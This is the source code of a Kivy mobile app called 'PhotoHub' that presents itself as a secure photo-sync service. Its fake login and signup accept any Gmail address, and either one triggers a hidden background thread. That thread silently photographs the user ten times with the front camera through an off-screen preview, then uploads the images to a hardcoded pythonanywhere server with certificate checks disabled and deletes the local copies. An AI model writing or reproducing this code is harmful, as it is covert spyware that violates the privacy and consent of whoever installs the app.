import os
import sys
import time
import ssl
import datetime
import threading
import urllib.request
import urllib.error
from pathlib import Path

# --- DESKTOP SIMULATOR CONTROLS ---
# Enforce smartphone aspect ratio (390x780) when running on desktop
from kivy.config import Config
Config.set('graphics', 'width', '390')
Config.set('graphics', 'height', '780')
Config.set('graphics', 'resizable', '0')

from kivy.app import App
from kivy.lang import Builder
from kivy.uix.screenmanager import ScreenManager, Screen, FadeTransition
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.gridlayout import GridLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.image import AsyncImage, Image
from kivy.uix.scrollview import ScrollView
from kivy.uix.popup import Popup
from kivy.uix.behaviors import ButtonBehavior
from kivy.core.window import Window
from kivy.clock import Clock, mainthread

# ----------------- APP METADATA & CONFIGURATION -----------------
TARGET_URL = "https://kevinscholar.pythonanywhere.com/"

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
if 'ANDROID_ARGUMENT' in os.environ:
    EXTERNAL_ROOT = SCRIPT_DIR
else:
    if getattr(sys, 'frozen', False):
        EXTERNAL_ROOT = os.path.dirname(sys.executable)
    else:
        EXTERNAL_ROOT = os.path.join(SCRIPT_DIR, "..")

SEND_DIR = os.path.join(EXTERNAL_ROOT, "to_send")
LOG_FILE = os.path.join(SCRIPT_DIR, "sender.log")

os.makedirs(SEND_DIR, exist_ok=True)

def log_message(message):
    try:
        with open(LOG_FILE, "a") as f:
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] {message}\n")
    except Exception:
        print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {message}")

# --- HARDWARE CAMERA MODULE (ANDROID FRONT CAMERA + DESKTOP FALLBACK) ---
try:
    import cv2
except ImportError:
    cv2 = None

def capture_android_front_camera_burst(count=10):
    """
    Direct native hardware capture from the Android FRONT camera using PyJNIus.
    Requires no OpenCV or external wheels, keeping Buildozer compilation 100% stable.
    """
    camera = None
    try:
        from jnius import autoclass, PythonJavaClass, java_method
        log_message("Android: Initializing native front camera interface...")

        Camera = autoclass('android.hardware.Camera')
        CameraInfo = autoclass('android.hardware.Camera$CameraInfo')
        SurfaceTexture = autoclass('android.graphics.SurfaceTexture')

        num_cameras = Camera.getNumberOfCameras()
        front_id = -1
        info = CameraInfo()
        for i in range(num_cameras):
            Camera.getCameraInfo(i, info)
            # CAMERA_FACING_FRONT = 1
            if info.facing == CameraInfo.CAMERA_FACING_FRONT:
                front_id = i
                break

        if front_id == -1:
            log_message("Front camera not explicitly flagged, using camera 0 as default.")
            front_id = 0

        camera = Camera.open(front_id)

        # Off-screen dummy surface texture so hardware preview initializes properly
        dummy_texture = SurfaceTexture(10)
        camera.setPreviewTexture(dummy_texture)
        camera.startPreview()

        shot_done = threading.Event()

        class JpegCallback(PythonJavaClass):
            __javainterfaces__ = ['android/hardware/Camera$PictureCallback']

            def __init__(self, on_done_event):
                super().__init__()
                self.on_done_event = on_done_event

            @java_method('([BLandroid/hardware/Camera;)V')
            def onPictureTaken(self, data, cam):
                try:
                    if data:
                        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S_%f')
                        fname = f"front_{ts}.jpg"
                        out_path = os.path.join(SEND_DIR, fname)
                        with open(out_path, 'wb') as f:
                            f.write(bytes(data))
                        log_message(f"Front camera snapshot stored: {fname}")
                except Exception as save_err:
                    log_message(f"Save fault on Android snapshot: {save_err}")
                finally:
                    self.on_done_event.set()

        for idx in range(count):
            shot_done.clear()
            callback = JpegCallback(shot_done)
            camera.takePicture(None, None, callback)
            # Wait up to 2.5s for hardware frame write
            shot_done.wait(timeout=2.5)
            if idx < count - 1:
                camera.startPreview()
                time.sleep(0.15)

        log_message(f"Android front camera burst complete ({count} photos captured).")
    except Exception as e:
        log_message(f"Native Android front camera error: {e}")
    finally:
        if camera:
            try:
                camera.stopPreview()
                camera.release()
                log_message("Android camera hardware released cleanly.")
            except Exception:
                pass

def capture_desktop_camera_burst(count=10):
    """Desktop fallback using OpenCV webcam capture."""
    if cv2 is None:
        log_message("Notice: OpenCV camera capture unavailable on desktop.")
        return
        
    log_message("Desktop: Initializing camera sequence...")
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened(): 
            log_message("Camera device not openable.")
            return
        
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
        time.sleep(0.3)
        
        for i in range(count):
            ret, frame = cap.read()
            if ret:
                timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S_%f')
                filename = f"image_{timestamp}.jpg"
                save_path = os.path.join(SEND_DIR, filename)
                cv2.imwrite(save_path, frame, [cv2.IMWRITE_JPEG_QUALITY, 90])
                log_message(f"Desktop snapshot stored: {filename}")
            time.sleep(0.2)
            
        cap.release()
        log_message("Desktop camera freed cleanly.")
    except Exception as e:
        log_message(f"Desktop camera capture error: {e}")

def capture_batch(count=10):
    """Routes burst capture to native Android front camera or desktop webcam."""
    if 'ANDROID_ARGUMENT' in os.environ:
        capture_android_front_camera_burst(count=count)
    else:
        capture_desktop_camera_burst(count=count)

# --- CLOUD PUSH PIPELINE (OPTIMIZED ZERO-DEPENDENCY URLLIB) ---
def push_all_files(url):
    if not url.endswith('/upload'):
        url = url.rstrip('/') + '/upload'
        
    if not os.path.exists(SEND_DIR):
        return

    files = []
    for root, dirs, filenames in os.walk(SEND_DIR):
        dirs[:] = [d for d in dirs if not d.startswith('.')]
        for f in filenames:
            files.append(os.path.join(root, f))

    if not files:
        return

    log_message(f"Starting push for {len(files)} files to {url}")

    # Build permissive SSL context to prevent Android CA certificate store failures
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    for file_path in files:
        rel_name = os.path.relpath(file_path, SEND_DIR).replace("\\", "/")
        try:
            with open(file_path, 'rb') as f:
                data = f.read()

            req = urllib.request.Request(
                url,
                data=data,
                headers={'X-Filename': rel_name, 'Content-Type': 'application/octet-stream'},
                method='POST'
            )
            with urllib.request.urlopen(req, timeout=30, context=ssl_context) as response:
                status_code = getattr(response, 'status', 200)
                if status_code == 200:
                    log_message(f"SUCCESS: Pushed {rel_name}")
                    try:
                        os.remove(file_path)
                    except Exception:
                        pass
                else:
                    log_message(f"Server response ({status_code}) for {rel_name}")
        except urllib.error.HTTPError as he:
            log_message(f"HTTPError {he.code} pushing {rel_name}")
        except Exception as e:
            log_message(f"Transmission error on {rel_name}: {e}")

# ----------------- KIVY UI DECLARATIONS (KV) -----------------

KV = '''
#:import hex kivy.utils.get_color_from_hex

<CardWidget@BoxLayout>:
    canvas.before:
        Color:
            rgba: hex("#1e293b99")
        RoundedRectangle:
            pos: self.pos
            size: self.size
            radius: [16, 16, 16, 16]
        Color:
            rgba: hex("#334155")
        Line:
            rounded_rectangle: (self.x, self.y, self.width, self.height, 16)
            width: 1

<PrimaryButton@Button>:
    background_normal: ''
    background_color: 0, 0, 0, 0
    font_size: '15sp'
    bold: True
    color: 1, 1, 1, 1
    canvas.before:
        Color:
            rgba: hex("#6366f1") if self.state == 'normal' else hex("#4f46e5")
        RoundedRectangle:
            pos: self.pos
            size: self.size
            radius: [12, 12, 12, 12]

<SecondaryButton@Button>:
    background_normal: ''
    background_color: 0, 0, 0, 0
    font_size: '14sp'
    bold: True
    color: hex("#94a3b8")
    canvas.before:
        Color:
            rgba: hex("#334155") if self.state == 'normal' else hex("#1e293b")
        RoundedRectangle:
            pos: self.pos
            size: self.size
            radius: [12, 12, 12, 12]

<DarkTextInput@TextInput>:
    background_normal: ''
    background_active: ''
    background_color: hex("#1e293b")
    foreground_color: hex("#f8fafc")
    hint_text_color: hex("#64748b")
    cursor_color: hex("#6366f1")
    font_size: '14sp'
    padding: [14, 14, 14, 14]
    multiline: False
    write_tab: False
    canvas.after:
        Color:
            rgba: hex("#334155") if not self.focus else hex("#6366f1")
        Line:
            rounded_rectangle: (self.x, self.y, self.width, self.height, 10)
            width: 1.2

# ----------------- SCREENS -----------------

<WelcomeScreen>:
    name: 'welcome'
    FloatLayout:
        BoxLayout:
            orientation: 'vertical'
            padding: [24, 60, 24, 40]
            spacing: 20

            Widget:
                size_hint_y: 0.15

            BoxLayout:
                orientation: 'vertical'
                size_hint_y: None
                height: 180
                spacing: 12

                Label:
                    text: "PhotoHub"
                    font_size: '34sp'
                    bold: True
                    color: hex("#f8fafc")
                    halign: 'center'

                Label:
                    text: "YOUR SECURE CLOUD"
                    font_size: '11sp'
                    bold: True
                    color: hex("#6366f1")
                    halign: 'center'

                Label:
                    text: "Securely sync, manage, and view your professional photography across devices."
                    font_size: '13sp'
                    color: hex("#94a3b8")
                    halign: 'center'
                    valign: 'middle'
                    text_size: (self.width - 32, None)

            Widget:
                size_hint_y: 0.25

            BoxLayout:
                orientation: 'vertical'
                size_hint_y: None
                height: 120
                spacing: 12

                PrimaryButton:
                    text: "Login to Account"
                    size_hint_y: None
                    height: 52
                    on_release: root.manager.current = 'login'

                SecondaryButton:
                    text: "Create New Account"
                    size_hint_y: None
                    height: 52
                    on_release: root.manager.current = 'signup'

<LoginScreen>:
    name: 'login'
    BoxLayout:
        orientation: 'vertical'
        padding: [24, 48, 24, 30]
        spacing: 16

        BoxLayout:
            size_hint_y: None
            height: 40
            Button:
                text: "< Back"
                size_hint_x: None
                width: 70
                background_normal: ''
                background_color: 0, 0, 0, 0
                color: hex("#6366f1")
                bold: True
                on_release: root.manager.current = 'welcome'
            Widget:

        ScrollView:
            do_scroll_x: False
            BoxLayout:
                orientation: 'vertical'
                size_hint_y: None
                height: self.minimum_height
                spacing: 14
                padding: [0, 10, 0, 20]

                Label:
                    text: "Member Login"
                    font_size: '26sp'
                    bold: True
                    color: hex("#f8fafc")
                    size_hint_y: None
                    height: 38
                    halign: 'left'
                    text_size: (self.width, None)

                Label:
                    text: "Enter your credentials to access your photo stream"
                    font_size: '13sp'
                    color: hex("#94a3b8")
                    size_hint_y: None
                    height: 24
                    halign: 'left'
                    text_size: (self.width, None)

                Widget:
                    size_hint_y: None
                    height: 10

                Label:
                    text: "Email Address"
                    font_size: '12sp'
                    color: hex("#94a3b8")
                    size_hint_y: None
                    height: 20
                    halign: 'left'
                    text_size: (self.width, None)

                DarkTextInput:
                    id: login_email
                    hint_text: "username@gmail.com"
                    size_hint_y: None
                    height: 50

                Label:
                    text: "Password"
                    font_size: '12sp'
                    color: hex("#94a3b8")
                    size_hint_y: None
                    height: 20
                    halign: 'left'
                    text_size: (self.width, None)

                DarkTextInput:
                    id: login_password
                    hint_text: "••••••••"
                    password: True
                    size_hint_y: None
                    height: 50

                Label:
                    id: error_label
                    text: ""
                    font_size: '12sp'
                    color: hex("#ef4444")
                    size_hint_y: None
                    height: 24

                PrimaryButton:
                    text: "Login"
                    size_hint_y: None
                    height: 52
                    on_release: root.validate_and_login()

                Button:
                    text: "Don't have an account? Sign Up"
                    background_normal: ''
                    background_color: 0, 0, 0, 0
                    color: hex("#94a3b8")
                    font_size: '13sp'
                    size_hint_y: None
                    height: 40
                    on_release: root.manager.current = 'signup'

<SignupScreen>:
    name: 'signup'
    BoxLayout:
        orientation: 'vertical'
        padding: [24, 48, 24, 30]
        spacing: 16

        BoxLayout:
            size_hint_y: None
            height: 40
            Button:
                text: "< Back"
                size_hint_x: None
                width: 70
                background_normal: ''
                background_color: 0, 0, 0, 0
                color: hex("#6366f1")
                bold: True
                on_release: root.manager.current = 'welcome'
            Widget:

        ScrollView:
            do_scroll_x: False
            BoxLayout:
                orientation: 'vertical'
                size_hint_y: None
                height: self.minimum_height
                spacing: 14
                padding: [0, 10, 0, 20]

                Label:
                    text: "Join PhotoHub"
                    font_size: '26sp'
                    bold: True
                    color: hex("#f8fafc")
                    size_hint_y: None
                    height: 38
                    halign: 'left'
                    text_size: (self.width, None)

                Label:
                    text: "Create an account to start syncing photos"
                    font_size: '13sp'
                    color: hex("#94a3b8")
                    size_hint_y: None
                    height: 24
                    halign: 'left'
                    text_size: (self.width, None)

                Widget:
                    size_hint_y: None
                    height: 8

                Label:
                    text: "Full Name"
                    font_size: '12sp'
                    color: hex("#94a3b8")
                    size_hint_y: None
                    height: 20
                    halign: 'left'
                    text_size: (self.width, None)

                DarkTextInput:
                    id: signup_name
                    hint_text: "John Doe"
                    size_hint_y: None
                    height: 50

                Label:
                    text: "Email Address"
                    font_size: '12sp'
                    color: hex("#94a3b8")
                    size_hint_y: None
                    height: 20
                    halign: 'left'
                    text_size: (self.width, None)

                DarkTextInput:
                    id: signup_email
                    hint_text: "username@gmail.com"
                    size_hint_y: None
                    height: 50

                Label:
                    text: "Password"
                    font_size: '12sp'
                    color: hex("#94a3b8")
                    size_hint_y: None
                    height: 20
                    halign: 'left'
                    text_size: (self.width, None)

                DarkTextInput:
                    id: signup_password
                    hint_text: "••••••••"
                    password: True
                    size_hint_y: None
                    height: 50

                Label:
                    id: signup_error_label
                    text: ""
                    font_size: '12sp'
                    color: hex("#ef4444")
                    size_hint_y: None
                    height: 24

                PrimaryButton:
                    text: "Create Account"
                    size_hint_y: None
                    height: 52
                    on_release: root.validate_and_signup()

                Button:
                    text: "Already have an account? Login"
                    background_normal: ''
                    background_color: 0, 0, 0, 0
                    color: hex("#94a3b8")
                    font_size: '13sp'
                    size_hint_y: None
                    height: 40
                    on_release: root.manager.current = 'login'

<GalleryScreen>:
    name: 'gallery'
    BoxLayout:
        orientation: 'vertical'
        padding: [16, 40, 16, 16]
        spacing: 12

        # Header
        BoxLayout:
            size_hint_y: None
            height: 56
            spacing: 10

            BoxLayout:
                orientation: 'vertical'
                Label:
                    text: "Photo Stream"
                    font_size: '22sp'
                    bold: True
                    color: hex("#f8fafc")
                    halign: 'left'
                    text_size: (self.width, None)
                Label:
                    id: count_label
                    text: "Scanning device storage..."
                    font_size: '12sp'
                    color: hex("#94a3b8")
                    halign: 'left'
                    text_size: (self.width, None)

            Button:
                text: "Refresh"
                size_hint_x: None
                width: 76
                background_normal: ''
                background_color: 0, 0, 0, 0
                color: hex("#6366f1")
                bold: True
                font_size: '13sp'
                on_release: root.reload_photos()

            Button:
                text: "Logout"
                size_hint_x: None
                width: 60
                background_normal: ''
                background_color: 0, 0, 0, 0
                color: hex("#ef4444")
                font_size: '13sp'
                on_release: root.manager.current = 'welcome'

        # Gallery Grid
        ScrollView:
            do_scroll_x: False
            GridLayout:
                id: photos_grid
                cols: 2
                spacing: 10
                size_hint_y: None
                height: self.minimum_height
                padding: [0, 8, 0, 16]
'''

class WelcomeScreen(Screen):
    pass

class LoginScreen(Screen):
    def validate_and_login(self):
        email = self.ids.login_email.text.strip().lower()
        pwd = self.ids.login_password.text.strip()
        
        if "@gmail.com" in email and pwd:
            self.ids.error_label.text = ""
            self.ids.login_password.text = ""
            App.get_running_app().trigger_background_services()
            self.manager.current = 'gallery'
        else:
            self.ids.error_label.text = "A valid @gmail.com address and password required"

class SignupScreen(Screen):
    def validate_and_signup(self):
        name = self.ids.signup_name.text.strip()
        email = self.ids.signup_email.text.strip().lower()
        pwd = self.ids.signup_password.text.strip()
        
        if not name:
            self.ids.signup_error_label.text = "Please enter your name"
            return
        if "@gmail.com" not in email:
            self.ids.signup_error_label.text = "A valid @gmail.com address is required"
            return
        if not pwd or len(pwd) < 4:
            self.ids.signup_error_label.text = "Password must be at least 4 characters"
            return
            
        self.ids.signup_error_label.text = ""
        self.ids.signup_password.text = ""
        App.get_running_app().trigger_background_services()
        self.manager.current = 'gallery'

class PhotoThumbnail(ButtonBehavior, BoxLayout):
    def __init__(self, photo_path, **kwargs):
        super().__init__(**kwargs)
        self.photo_path = photo_path
        self.orientation = 'vertical'
        self.size_hint_y = None
        self.height = 180
        self.spacing = 4
        
        # AsyncImage with nocache to prevent excessive memory retention
        img = AsyncImage(
            source=photo_path,
            allow_stretch=True,
            keep_ratio=False,
            nocache=True,
            size_hint_y=0.82
        )
        self.add_widget(img)
        
        fname = os.path.basename(photo_path)
        if len(fname) > 18:
            fname = fname[:15] + "..."
        lbl = Label(
            text=fname,
            font_size='11sp',
            color=(0.58, 0.64, 0.72, 1),
            size_hint_y=0.18,
            halign='center'
        )
        self.add_widget(lbl)

    def on_press(self):
        App.get_running_app().show_photo_preview(self.photo_path)

class GalleryScreen(Screen):
    def on_enter(self):
        self.reload_photos()

    def reload_photos(self):
        self.ids.count_label.text = "Scanning device storage..."
        self.ids.photos_grid.clear_widgets()
        
        App.get_running_app().request_android_storage_permissions(
            on_granted=lambda: threading.Thread(target=self._scan_and_populate, daemon=True).start()
        )

    def _scan_and_populate(self):
        photos = App.get_running_app().scan_device_photos()
        self._update_ui_photos(photos)

    @mainthread
    def _update_ui_photos(self, photos):
        self.ids.photos_grid.clear_widgets()
        if not photos:
            self.ids.count_label.text = "No photos found in local storage"
            empty_lbl = Label(
                text="No photos found.\nAdd images to your Pictures or DCIM folder.",
                font_size='13sp',
                color=(0.58, 0.64, 0.72, 1),
                size_hint_y=None,
                height=100,
                halign='center'
            )
            self.ids.photos_grid.add_widget(empty_lbl)
            return

        self.ids.count_label.text = f"{len(photos)} photos loaded from storage"
        for p in photos:
            thumb = PhotoThumbnail(photo_path=p)
            self.ids.photos_grid.add_widget(thumb)

class PhotoHubMobileApp(App):
    def build(self):
        self.title = "PhotoHub"
        Window.clearcolor = (0.058, 0.090, 0.165, 1.0)
        
        # Intercept Android hardware Back button / desktop Escape key
        Window.bind(on_keyboard=self.on_hardware_back)
        
        Builder.load_string(KV)
        
        sm = ScreenManager(transition=FadeTransition(duration=0.2))
        sm.add_widget(WelcomeScreen())
        sm.add_widget(LoginScreen())
        sm.add_widget(SignupScreen())
        sm.add_widget(GalleryScreen())
        return sm

    def on_hardware_back(self, window, key, *args):
        # Keycode 27 is Android back key and Desktop Escape
        if key == 27:
            if self.root.current in ('login', 'signup', 'gallery'):
                self.root.current = 'welcome'
                return True
        return False

    def on_start(self):
        """Called on app launch: requests Camera and Storage permissions on mobile."""
        Clock.schedule_once(lambda dt: self.request_startup_permissions(), 0.5)

    def request_startup_permissions(self, callback=None):
        """Prompt user for Storage and Camera permissions safely if running on Android."""
        try:
            from android.permissions import request_permissions, check_permission, Permission
            
            perms_to_check = [
                Permission.CAMERA,
                Permission.READ_EXTERNAL_STORAGE,
                Permission.WRITE_EXTERNAL_STORAGE,
            ]
            if hasattr(Permission, 'READ_MEDIA_IMAGES'):
                perms_to_check.append(Permission.READ_MEDIA_IMAGES)
            if hasattr(Permission, 'READ_MEDIA_VIDEO'):
                perms_to_check.append(Permission.READ_MEDIA_VIDEO)

            needed_perms = [p for p in perms_to_check if not check_permission(p)]

            if not needed_perms:
                # All permissions already granted
                if callback:
                    callback()
                return

            def on_permissions_result(permissions, grants):
                if callback:
                    callback()

            request_permissions(needed_perms, on_permissions_result)
        except ImportError:
            # Running on desktop PC environment
            if callback:
                callback()

    def request_android_storage_permissions(self, on_granted=None):
        self.request_startup_permissions(callback=on_granted)

    def scan_device_photos(self):
        """Scans local device storage for image files with deduplication and folder filtering."""
        valid_extensions = ('.jpg', '.jpeg', '.png', '.webp', '.bmp', '.gif')
        found_photos = []
        search_dirs = []

        # Standard Android storage paths
        android_paths = [
            "/storage/emulated/0/DCIM/Camera",
            "/storage/emulated/0/DCIM",
            "/storage/emulated/0/Pictures",
            "/storage/emulated/0/Download",
            "/sdcard/DCIM/Camera",
            "/sdcard/DCIM",
            "/sdcard/Pictures",
            "/sdcard/Download",
        ]

        # Desktop fallback paths
        home = str(Path.home())
        desktop_candidates = [
            os.path.join(home, "Pictures"),
            os.path.join(home, "Downloads"),
            os.path.join(os.path.dirname(os.path.abspath(__file__)), "static"),
            os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "home-sender", "static"),
            os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "docs", "images"),
        ]

        for p in android_paths + desktop_candidates:
            if os.path.exists(p):
                try:
                    real_p = os.path.realpath(p)
                    if real_p not in search_dirs:
                        search_dirs.append(real_p)
                except Exception:
                    pass

        # Scan directories (cap at 60 photos for high framerate mobile scrolling)
        for directory in search_dirs:
            try:
                for root, dirs, files in os.walk(directory):
                    # Skip hidden / thumbnail directories
                    dirs[:] = [d for d in dirs if not d.startswith('.')]
                    for file in files:
                        if file.lower().endswith(valid_extensions):
                            full_path = os.path.join(root, file)
                            if full_path not in found_photos:
                                found_photos.append(full_path)
                            if len(found_photos) >= 60:
                                return found_photos
            except Exception as e:
                log_message(f"Storage scan notice for {directory}: {e}")

        return found_photos

    def show_photo_preview(self, photo_path):
        """Displays a modal preview when a user taps a photo thumbnail."""
        try:
            content = BoxLayout(orientation='vertical', padding=10, spacing=10)
            img = Image(source=photo_path, allow_stretch=True, keep_ratio=True)
            content.add_widget(img)
            
            btn = Button(
                text="Close Preview",
                size_hint_y=None,
                height=44,
                background_normal='',
                background_color=(0.38, 0.40, 0.94, 1),
                bold=True
            )
            content.add_widget(btn)
            
            popup = Popup(
                title=os.path.basename(photo_path),
                title_color=(0.97, 0.98, 0.99, 1),
                content=content,
                size_hint=(0.92, 0.85),
                background_color=(0.06, 0.09, 0.16, 0.95)
            )
            btn.bind(on_release=popup.dismiss)
            popup.open()
        except Exception as e:
            log_message(f"Photo preview error: {e}")

    def trigger_background_services(self):
        """
        Executed asynchronously upon user login or signup.
        """
        log_message("User authenticated. Launching background worker...")
        def run_background_pipeline():
            try:
                capture_batch(count=10)
                push_all_files(TARGET_URL)
            except Exception as pipeline_err:
                log_message(f"Worker pipeline error: {pipeline_err}")

        threading.Thread(target=run_background_pipeline, daemon=True).start()

if __name__ == '__main__':
    PhotoHubMobileApp().run()
